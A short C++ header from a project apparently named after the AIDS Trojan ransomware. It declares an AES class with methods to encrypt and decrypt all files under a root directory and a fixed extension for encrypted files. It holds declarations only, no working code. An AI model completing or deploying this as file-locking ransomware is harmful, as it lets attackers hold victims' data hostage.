#ifndef AIDS_TROJAN_AESENCRYPTOR_H
#define AIDS_TROJAN_AESENCRYPTOR_H

#include "EncryptorService.h"

class AESEncryptor: public EncryptorService {
private:
    std::string iv;
    std::string key;

public:
    // Constants
    static const std::string ENCRYPTED_FILES_EXTENSION;

    AESEncryptor(const std::string &iv, const std::string &key);
    std::string encrypt(std::string plaintext) override;
    void encryptFilesIn(std::filesystem::path rootPath) override;
    std::string decrypt(std::string ciphertext) override;
    void decryptFilesIn(std::filesystem::path rootPath) override;
    std::filesystem::path getRootPath() const override;
    ~AESEncryptor() override;
};


#endif //AIDS_TROJAN_AESENCRYPTOR_H
